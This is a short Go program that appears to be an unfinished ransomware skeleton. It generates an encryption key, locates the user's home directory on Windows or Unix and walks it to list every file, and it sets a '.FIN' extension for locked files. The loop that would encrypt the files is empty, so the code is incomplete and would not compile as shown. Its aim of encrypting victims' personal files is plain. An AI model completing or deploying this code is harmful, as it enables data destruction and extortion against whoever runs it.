package main

import (
	"os"
	"path/filepath"
	"runtime"

	"github.com/goLocker/locker"
)

func main() {
	var files []string
	var home string
	var ext = ".FIN"

	newkey := locker.KeyGen()

	// Logic to determine if host is running Windows
	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else {
		home = os.Getenv("HOME")
	}

	err := filepath.Walk(home, locker.Walker(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {

	}
}
